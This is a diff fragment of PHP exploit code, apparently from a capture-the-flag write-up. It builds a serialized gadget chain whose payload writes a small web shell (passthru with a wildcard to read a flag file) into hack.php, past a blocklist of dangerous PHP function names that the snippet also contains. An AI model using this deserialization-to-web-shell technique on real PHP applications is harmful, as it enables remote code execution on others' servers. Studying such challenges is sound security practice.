@@ -48,18 +48,21 @@ class evil extends hack {
     function __construct(){
         $this->data='<?=passthru("sort /fffffl?ggggg");?>';
     }
-    protected function shell(){
-        $hack=fopen("hack.php","w") or die("Unable 2 open");
-        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/i',$this->data)){
+    protected function shell(){        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/i',$this->data)){
             die("you die");
            }
-        fwrite($hack,$this->data);
-        fclose($hack);
+        $dir = 'scandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
+        if(!file_exists($dir)){
+            mkdir($dir);
+            echo $dir;
+        }
+        file_put_contents("$dir" . "hack.php", $this->data);
     }
 }
 $a=serialize(new Openfunc());
 echo $a;
 echo urlencode($a);
 ?>
+
 ```
 
